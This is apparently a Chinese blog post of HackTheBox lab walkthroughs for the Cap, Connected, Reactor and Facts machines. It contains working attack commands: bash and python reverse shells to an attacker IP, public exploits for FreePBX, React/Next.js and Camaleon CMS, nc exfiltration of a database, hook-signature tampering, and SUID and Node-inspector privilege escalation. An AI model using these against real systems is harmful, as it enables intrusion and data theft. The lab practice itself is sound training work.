---
title: HackTheBox记录01
published: 2026-06-18T18:00:00
description: hackthebox靶场记录
tags:
  - HackTheBox
  - 靶场
category: 网络安全
draft: false
---

# 靶场通关记录

# 靶场：Cap(Linux)

## Task 1

How many TCP ports are open?

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.129.5.250
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-18 06:54 -0400
Nmap scan report for 10.129.5.250
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

answer：3

## Task 2

After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?

访问页面之后，是一个网络抓包分析系统，在导航栏找到Security Snapshot (5 Second PCAP + Analysis)，点进去就会发现url是这样的：`http://10.129.5.250/data/1`

answer：data

## Task 3

Are you able to get to other users' scans?

修改url中的`id`部分

answer：yes

## Task 4/5

Task 4 Q：What is the ID of the PCAP file that contains sensative data?

Task 5 Q：Which application layer protocol in the pcap file can the sensetive data be found in?

使用burp，在上一步骤手工测试了1-3是存在的，但是实际上使用burp爆破发现还有个0

sniper attack->给url中的id加变量符->payload type选numbers->从0开始

`data/0`和其他的数据包长度不同，于是修改url，将该抓包文件进行下载，使用wireshark分析，发现FTP协议存在账户密码泄露

`36	4.126500	192.168.196.1	192.168.196.16	FTP	69	Request: USER nathan`

`40	5.424998	192.168.196.1	192.168.196.16	FTP	78	Request: PASS Buck3tH4TF0RM3!`

Task 4 answer：0

Task 5 answer：FTP

## Task 6

We've managed to collect nathan's FTP password. On what other service does this password work?

这下就可以尝试一下ssh登录

```
──(kali㉿kali)-[~/Desktop]
└─$ ssh nathan@10.129.5.250
The authenticity of host '10.129.5.250 (10.129.5.250)' can't be established.
ED25519 key fingerprint is: SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.5.250' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nathan@10.129.5.250's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
```

成功登录，发现当前目录下就是user的flag

```
nathan@cap:~$ ls
user.txt
nathan@cap:~$ cat user.txt 
f3e11475bd7f5f631ab75ec33b38f431
```

answer：SSH

## Task 8

What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?

那么接下来就需要提权root，拿到最后的flag了，需要借助到工具linPEAS

### **linPEAS**

**介绍**：

**用于在 Linux/Unix/MacOS 主机上搜索提升权限的可能路径**

LinPEAS 使用颜色来指示每个部分的起始位置。但**它也使用颜色来识别潜在的配置错误**。

1. **红色/黄色**用于识别导致 PE 的配置（99% 确定）
2. 红色用于识别可能导致权限提升的可疑配置
3. 绿色用于表示已知良好的配置（根据名称而非内容判断！）
4. 蓝色用于：无 shell 的用户和已挂载的**设备**
5. 浅**青色**用于：使用 shell 的用户
6. 浅**洋红色**用于：当前用户名

其他还有参数介绍，详细可以看：[github.com/peass-ng/PEASS-ng/tree/master/linPEAS](linPEAS)

依旧攻击机启动一个web服务，使用目标机来下载linpeas，之后赋予权限并启动

对攻击机的操作：

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.5.250 - - [18/Jun/2026 07:30:35] "GET /linpeas.sh HTTP/1.1" 200 -
```

对目标机的操作：

```
nathan@cap:~$ wget http://10.10.16.230/linpeas.sh
--2026-06-18 11:30:35--  http://10.10.16.230/linpeas.sh
Connecting to 10.10.16.230:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1063041 (1.0M) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                100%[====================================>]   1.01M   971KB/s    in 1.1s    

2026-06-18 11:30:36 (971 KB/s) - ‘linpeas.sh’ saved [1063041/1063041]

nathan@cap:~$ ls
linpeas.sh  user.txt
nathan@cap:~$ chmod +x linpeas.sh
nathan@cap:~$ ./linpeas.sh
```

扫描发现有一处标红部分，一般颜色比较突出的就是可利用部分

```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

可以发现python3.8有特殊权限利用这个提权，可以设置uid为0（root的uid通常为0），然后去执行bash

```
nathan@cap:~$ python3 -c "import os;os.setuid(0);os.system('/bin/bash')"
root@cap:~# ls
linpeas.sh  snap  user.txt
root@cap:~# cat /root/root.txt 
640bbd78aa4c1f8e97c799598d3f3205
```

Task 8 answer：/usr/bin/python3.8

Nathan answer：f3e11475bd7f5f631ab75ec33b38f431

Root answer：640bbd78aa4c1f8e97c799598d3f3205

# 靶场：Connected(Linux)

没有问题，只有两个flag

扫描端口发现

```
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: 400 Bad Request
|_ssl-date: TLS randomness does not represent time
// ssl证书
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.58 seconds
```

域名为`connected.htb`，web服务apache+php7.4.16，ssl证书`pbxconnect`，说明这可能是pbx（电话交换机）系统

直接访问打不开，写入hosts文件

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "10.129.6.182 connected.htb" | sudo tee -a /etc/hosts 
10.129.6.182 connected.htb
```

这次打开后被重定向到了`http://connected.htb/admin/config.php`，站点标题为FreePbx，Google发现存在过多个严重的远程代码执行（RCE）漏洞，下载一个官方poc：`https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819`

```
python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H https://connected.htb
```

拿到webshell

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H https://connected.htb
                         __         ___  ___________                   
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________ 
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|   
                                  \/          \/     \/                            
          
        watchTowr-vs-FreePBX-CVE-2025-57819.py
        (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE

          - Piotr and Sonny of watchTowr

[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found: https://connected.htb/this-is-an-ioc-not-actually-watchTowr-mbt9h7565j.php?cmd=hostname
[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table
```

不能目录遍历，先测试一下webshell能不能用，如果可以，能不能反弹shell给攻击机

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -k "https://connected.htb/this-is-an-ioc-not-actually-watchTowr-mbt9h7565j.php?cmd=whoami"
asterisk
```

这里发现是可以的，尝试反弹（无效操作）

```     
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -k "https://connected.htb/this-is-an-ioc-not-actually-watchTowr-mbt9h7565j.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.16.230%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/sh%22,%22-i%22])%27"
curl: (3) bad range specification in URL position 299:
https://connected.htb/this-is-an-ioc-not-actually-watchTowr-mbt9h7565j.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.16.230%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/sh%22,%22-i%22])%27
```

curl 报错是因为 URL 中的特殊字符（方括号 `[]`）没有被正确编码，生成base64编码的脚本，最后发现行不通（无效操作）

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.230",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' | base64 -w0
```

webshell行不通，改为`使用bash反弹shell`进行尝试

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -k --get "https://connected.htb/this-is-an-ioc-not-actually-watchTowr-mbt9h7565j.php" \
  --data-urlencode "cmd=bash -c 'exec bash -i >& /dev/tcp/10.10.16.230/4444 0>&1'"
```

成功拿到shell，也拿下了用户的flag

```
[asterisk@connected admin]$ cd /home    
cd /home
[asterisk@connected home]$ ls
ls
asterisk
[asterisk@connected home]$ cd asterisk
cd asterisk
[asterisk@connected asterisk]$ cat user.txt
cat user.txt
a5a948b611b9fe60702a57c6d423dc75
```

现在要做的就是提权了，启个服务，让目标机下载linpeas，加权限并执行

对攻击机的操作：

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.6.182 - - [19/Jun/2026 04:28:36] "GET /linpeas.sh HTTP/1.1" 200 -
```

对目标机的操作：

```
[asterisk@connected asterisk]$ wget http://10.10.16.230:80/linpeas.sh -O /tmp/linpeas.sh
<k]$ wget http://10.10.16.230:80/linpeas.sh -O /tmp/                       linpeas.sh
--2026-06-19 08:28:36--  http://10.10.16.230/linpeas.sh
Connecting to 10.10.16.230:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1063041 (1.0M) [application/x-sh]
Saving to: '/tmp/linpeas.sh'

[asterisk@connected tmp]$ chmod +x linpeas.sh                              
chmod +x linpeas.sh                                                                                            
[asterisk@connected tmp]$ ./linpeas.sh                                     
./linpeas.sh
```

**先做了解**：

**incron** 是**文件事件触发**的任务系统

**介绍**：

|                  部分                  |          含义           |
| :----------------------------------: | :-------------------: |
|     `/var/spool/asterisk/incron`     |        监控这个目录         |
| `IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE` |   当文件被修改、属性改变、写入关闭时   |
|    `/usr/bin/sysadmin_manager $#`    | 执行这个命令，`$#` 是触发事件的文件名 |

使用过滤，只显示`/etc`的结果，以下输出的信息发现有点可疑

这是一个 **incron** 任务，监控 `/var/spool/asterisk/sysadmin/intrusion_detection_stop` 文件，当文件被写入（`IN_CLOSE_WRITE`）时，以**root 权限**执行 `/etc/init.d/fail2ban stop`

```
[asterisk@connected html]$ grep -i "/etc" /tmp/linpeas_output.txt | head -100
grep -i "/etc" /tmp/linpeas_output.txt | head -100
_laurel     712  0.9  0.2  31552  9720 ?        S<   07:33   0:45      _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
chrony      755  0.0  0.0 117816  3276 ?        S    07:33   0:00 /usr/sbin/chronyd -f /etc/sangoma_chrony.conf
mongodb    1238  0.5  1.6 478864 64028 ?        Sl   07:33   0:27 /usr/bin/mongod --quiet -f /etc/mongod.conf run
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
```

查看系统incron任务，发现关键的两个，**`$#` 是触发事件的文件名**，会被作为参数传给 `sysadmin_manager`

```
[asterisk@connected html]$ cat /etc/incron.d/*
cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha

// 关键就是最后这两个
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

由于 incron 监控 `/var/spool/asterisk/incron` 目录，当文件被修改时执行 `/usr/bin/sysadmin_manager $#`，我们可以利用 `$#` 参数执行命令，于是进行查看`/usr/bin/sysadmin_manager`文件类型，发现是一个PHP脚本，尝试写入反弹shell代码发现不能进行读写，遂放弃

```
// 代码内容（后期发现，只贴出关键部分）
if ($module == "SYSTEM") {
        $signame = $hookfile;
} else {
        $signame = "hooks/$hook";
        
// Warning: This explicitly breaks utf8. If you need unicode, base64 it.
if (preg_match('/[^\x20-\x7e]/', $params, $out)) {
        syslog(LOG_ERR, "Out of spec char in params $params, ".json_encode($out));
        exit;

// 反弹shell代码（没成功）
<?php system("bash -c 'exec bash -i >& /dev/tcp/10.10.16.230/4444 0>&1'"); ?>
```

**在进行后续内容时，先了解一下**：

**Hook = 一个脚本文件**（通常是 bash 或 PHP 脚本），**当某个事件发生时被自动执行**。

在这个目标机也就是靶机中，**incron 是触发机制**：`某个文件被修改 → incron 检测到 → 执行 /usr/bin/sysadmin_manager`，**sysadmin_manager 是调度器**：`收到 incron 的通知 → 解析参数 → 找到对应的 hook → 执行 hook`，**Hook 是实际执行任务的脚本**：`执行 hook → hook 里写的是具体命令（比如重启服务、修改配置、执行命令）`

---

对攻击机的操作：（无效操作）

```
nc -lvnp 4444
```

对目标机的操作：（无效操作）

```
echo '#!/bin/bash
bash -c "exec bash -i >& /dev/tcp/10.10.16.230/4444 0>&1"' > /var/www/html/admin/modules/sysadmin/hooks/reboot

cat /var/www/html/admin/modules/sysadmin/hooks/reboot

cd /var/spool/asterisk/incron
echo "test" > sysadmin_reboot
```

到这里依然是攻击机没有监听到连接，目标机触发incron没用

**现在的解决方案是：要利用 `incron` 创建SUID Shell，而非依赖反弹**

既然直接反弹可能受阻，我们可以换一个“本地提权”的思路：用 `incron` 去修改 `/bin/bash`，给它加上SUID权限，这样就可以在当前的 `asterisk` Shell里直接变成 root

**以下为发现代码内容后的修改步骤**

查找可修改的hook文件

```
[asterisk@connected incron]$ find /var/www/html/admin/modules/ -path "*/hooks/*" -type f
```

修改reboot hook为提权命令

```
[asterisk@connected incron]$ cat > /var/www/html/admin/modules/sysadmin/hooks/reboot << 'EOF'
<$ cat > /var/www/html/admin/modules/sysadmin/hooks/reboot << 'EOF'          
> #!/bin/bash
#!/bin/bash
> chmod 7777 /bin/bash
chmod 7777 /bin/bash
> EOF
EOF
You have new mail in /var/mail/asterisk
```

计算新hash，伪造签名

```
[asterisk@connected incron]$ NEW_HASH=$(sha256sum /var/www/html/admin/modules/sysadmin/hooks/reboot | awk '{print $1}')
<r/www/html/admin/modules/sysadmin/hooks/reboot | awk '{print $1}')  
```

更新签名文件，把假的变成真的

```
[asterisk@connected incron]$ sed -i "s/hooks\/reboot = .*/hooks\/reboot = $NEW_HASH/" \
    /var/www/html/admin/modules/sysadmin/module.sig
```

触发执行

```
[asterisk@connected incron]$ touch sysadmin.reboot
touch sysadmin.reboot
```

检查结果

```
[asterisk@connected incron]$ ls -la /bin/bash
ls -la /bin/bash
-rwsrwsrwt. 1 root root 964536 Apr  1  2020 /bin/bash
You have new mail in /var/mail/asterisk
```

**提权**并拿到flag

```
/bin/bash -p
whoami
root

cat /root/root.txt
ff74454b79a21ed713c0f2f1277b8e8f
```

Asterisk answer：a5a948b611b9fe60702a57c6d423dc75

Root answer：ff74454b79a21ed713c0f2f1277b8e8f

# 靶场：Reactor(Linux)

先nmap扫一下，发现开了22和3000

```
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Sat, 20 Jun 2026 04:08:49 GMT
|     Connection: close
```

直接访问发现没什么可利用的信息

但是扫描发现是Next.js，而Next.js基于react

```
x-nextjs-cache:HIT
x-nextjs-prerender:1
x-nextjs-stale-time:4294967294
X-Powered-By:Next.js
```

使用nuclei扫一下是否该站点是否使用了存在漏洞的react包或者Next.js版本（无效操作）

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nuclei -u http://10.129.7.70:3000 -tags nextjs


                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.8.0

                projectdiscovery.io

[INF] nuclei-templates are not installed, installing...
[INF] Successfully installed nuclei-templates at /home/kali/.local/nuclei-templates
[WRN] Found 1 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.8.0 (outdated)
[INF] Current nuclei-templates version: v10.4.4 (latest)
[INF] New templates added in latest release: 179
[INF] Templates loaded for current scan: 14
[INF] Executing 14 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Using Interactsh Server: oast.online
[INF] Scan completed in 7.084321635s. 0 matches found.
```

没扫到，手动搜索一下react爆出过的漏洞，发现CVE-2025-55182 RCE漏洞，poc下载地址：`https://github.com/ThemeHackers/CVE-2025-55182`

克隆仓库到本地使用，需要安装一下python依赖，这里创建python虚拟环境使用

```
┌──(kali㉿kali)-[~/Desktop/CVE-2025-55182]
└─$ python3 -m venv venv

                                                                                                     
┌──(kali㉿kali)-[~/Desktop/CVE-2025-55182]
└─$ source venv/bin/activate

                                                                                                     
┌──(venv)─(kali㉿kali)-[~/Desktop/CVE-2025-55182]
└─$ pip install -r requirements.txt
```

接下来就可以正常使用了，检测漏洞是否存在

```
┌──(venv)─(kali㉿kali)-[~/Desktop/CVE-2025-55182]
└─$ python CVE-2025-55182.py -u http://10.129.7.70:3000
React2Shell Scanner - CVE-2025-55182/CVE-2025-66478
[*] Loaded 1 host(s) to scan
[*] Using 10 thread(s)
[*] Timeout: 10s
[*] Using RCE PoC check
[!] SSL verification disabled

[DEBUG] Elapsed: 0.45s (Variant: None)
[VULNERABLE] http://10.129.7.70:3000 - RCE Confirmed!

=== HTTP Response ===
**Status: 303**
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, 
Accept-Encoding
cache-control: private, no-cache, no-store, max-age=0, must-revalidate
x-action-revalidated: [[],0,0]
**x-action-redirect: /login?a=MTExMTEK;push**
content-type: text/x-component
date: Sat, 20 Jun 2026 03:26:29 GMT
x-nextjs-cache: HIT
x-nextjs-prerender: 1
X-Powered-By: Next.js
Content-Encoding: gzip
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

[VULNERABLE] http://10.129.7.70:3000 - Status: 303
```

根据放出的部分响应信息，确认漏洞存在，先退出python虚拟环境

```
┌──(venv)─(kali㉿kali)-[~/Desktop/CVE-2025-55182]
└─$ deactivate
```

获取shell，并发现数据库文件

```
┌──(kali㉿kali)-[~/Desktop/CVE-2025-55182]
└─$ python CVE-2025-55182.py -u http://10.129.7.70:3000 --exploit

React2Shell Scanner - CVE-2025-55182/CVE-2025-66478
[*] Starting interactive shell on http://10.129.7.70:3000
[*] Type 'exit' or 'quit' to stop
Shell> ls
app
next.config.js
node_modules
package.json
package-lock.json
reactor.db
```

使用nc传输文件，攻击机下载数据库文件并查看

对目标机的操作：

```
Shell> nc 10.10.16.230 4444 < reactor.db
1367733479
```

对攻击机的操作：

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 4444 > received_reactor.db
```

数据库user表中存放的信息如下

```
admin	a203b22191d744a4e70ada5c101b17b8	administrator	admin@reactor.htb
engineer	39d97110eafe2a9a68639812cd271e8e	operator	engineer@reactor.htb

// 进行md5解密，admin的是付费记录，engineer的密码为：reactor1
```

ssh进行连接，拿到engineer的flag

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh engineer@10.129.7.70

engineer@reactor:~$ ls                                                   
user.txt                                                                 
engineer@reactor:~$ cat user.txt 
23279ecbfeceb8c58416da69e6ca9f65
```

接下来依旧是提权环节，Next.js 应用本质上是一个 **Node.js 应用**，查看后台进程搜索出包含node关键词的行，也可以使用linpeas进行扫描，这里省点时间就直接搜索关键词了，不过结果都是一样的

```
engineer@reactor:~$ ps aux | grep node
node        1418  3.7  3.0 11828308 121144 ?     Ssl  02:10   3:33 next-server (v15.0.3)
root        1420  0.0  1.1 1066424 46912 ?       Ssl  02:10   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
node        1739  0.0  0.5  29228 20124 ?        S    03:34   0:00 python3 -m http.server 8000
engineer    1824  0.0  0.0   6544  2280 pts/0    S+   03:45   0:00 grep --color=auto node
```

发现了一个以`root`身份运行，并开启了**Node.js调试模式**（`--inspect`）的脚本

**了解**：

当 Node.js 进程以 `--inspect` 模式启动时，它会启动一个**调试服务器**，并默认在 `http://127.0.0.1:9229` 提供一个 **HTTP API**

其中，最重要的端点就是这个 **`/json`** 接口：

|       端点        |                                作用                                |
| :-------------: | :--------------------------------------------------------------: |
|  `/json/list`   |          返回所有可调试目标（脚本）的列表（与 `/json` 功能相同，建议使用 `/json`）           |
| `/json/version` |                     返回 Node.js 版本和调试器协议版本信息                      |
|     `/json`     | 等同于 `/json/list`，返回所有可调试目标的详细信息，包括每个脚本的 ID、标题、类型和 WebSocket 调试地址 |

**验证调试接口是否可访问**，发现websocket地址，但无法连接，利用ws连接调试端口可以看这位师傅的文章：[https://blog.csdn.net/weixin_44368093/article/details/161388843]()

```
engineer@reactor:~$ curl http://127.0.0.1:9229/json
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/02622acc-24b0-4a39-aaaa-a48bf36a5bcf",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/02622acc-24b0-4a39-aaaa-a48bf36a5bcf",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "02622acc-24b0-4a39-aaaa-a48bf36a5bcf",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/02622acc-24b0-4a39-aaaa-a48bf36a5bcf"
} ]
```

考虑在无需任何网络转发的情况下，**直接在目标机上启动 Node.js 调试客户端**

```
engineer@reactor:~$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok
```

设置SUID权限位，提权成功并拿到flag

**解释**：

|              部分              |                   含义                   |
| :--------------------------: | :------------------------------------: |
| `process.mainModule.require` |  Node.js中加载模块的另一种写法，等同于 `require()`。   |
|     `('child_process')`      | 加载Node.js的 **子进程模块**，这个模块提供了执行系统命令的能力。 |
|        `.execSync()`         | **同步执行**一个系统命令，并返回结果。它会阻塞程序，直到命令执行完毕。  |
|   `('chmod +s /bin/bash')`   |         在目标系统上执行的 **Shell命令**。         |

```
debug> repl
Press Ctrl+C to leave debug repl
> process.mainModule.require('child_process').execSync('chmod +s /bin/bash')
Uint8Array(0)
> .exit
engineer@reactor:~$ /bin/bash -p
bash-5.2# cat /root/root.txt
82bdc985955a80a1d26b67d2ceca9150
```

Engineer answer：23279ecbfeceb8c58416da69e6ca9f65

Root answer：82bdc985955a80a1d26b67d2ceca9150

# 靶场：Facts(Linux)

nmap扫描

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.129.7.169 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-20 06:16 -0400
Nmap scan report for 10.129.7.169
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

无法直接访问，本地DNS覆盖

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo echo '10.129.7.169 facts.htb' | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.129.7.169 facts.htb
```

正常访问，没什么可利用的信息，发现有评论区，那说明肯定有登录，扫一下目录

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/dirb/small.txt

// 发现admin有重定向
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1473ms]
```

发现登录页面存在注册功能，随便注册一个账号，进入后台只有一个控制面板，页尾部分标明为**Camaleon CMS**版本为**2.9.0**

查一下Camaleon CMS相关漏洞，CVE-2025-2304 - Camaleon CMS Privilege Escalation，POC：[https://github.com/predyy/CVE-2025-2304]()

```
┌──(kali㉿kali)-[~/Desktop/CVE-2025-2304]
└─$ python3 exp.py http://facts.htb bza 111111
[*] Logging in as bza ...
[+] Login successful
[+] Got profile page
[i] Version detected: 2.9.0 (< 2.9.1) - appears to be vulnerable version
[+] authenticity_token: 4u_tPCFoTxCP-Z5vBu6woqSa0dK_seNZQn2-x0d_qBhKf8QMM1kQq9l6K8fY3qtyGH1CTohStxrpwHLKzGQqqg
http://facts.htb/admin/users/6/updated_ajax
[*] Submitting password change request
[+] Submit successful, you should be admin
```

再次登录发现，权限已经变成Administrator，页面也不同了，找寻有价值信息

发现存在一个配置，是Amazon的s3存储桶，内容如下：

|           标题           |                    信息                    |
| :--------------------: | :--------------------------------------: |
| Aws s3 access key (*)  |           AKIACB2F36C4E23F13AD           |
| Aws s3 secret key (*)  | zAnDp7t/ItkB4gP+t7v7R8RGMfdr0SC7wjtJYL8Y |
| Aws s3 bucket name (*) |               randomfacts                |
|     Aws s3 区域 (*)      |                us-east-1                 |
| Aws s3 bucket endpoint |          http://localhost:54321          |
|     Cloudfront url     |       http://facts.htb/randomfacts       |

配置并查看发现有两个桶，查看有无敏感信息，发现存在`authorized_keys`文件，它包含**允许登录的用户公钥列表**，下载发现文件中没有存在用户名，同时还需要下载ssh密钥文件

```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws configure --profile htb
AWS Access Key ID [None]: AKIACB2F36C4E23F13AD
AWS Secret Access Key [None]: zAnDp7t/ItkB4gP+t7v7R8RGMfdr0SC7wjtJYL8Y
Default region name [None]: randomfacts
Default output format [None]: json

┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3 ls --profile htb  --endpoint-url http://10.129.7.169:54321
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts

┌──(kali㉿kali)-[~/Desktop]
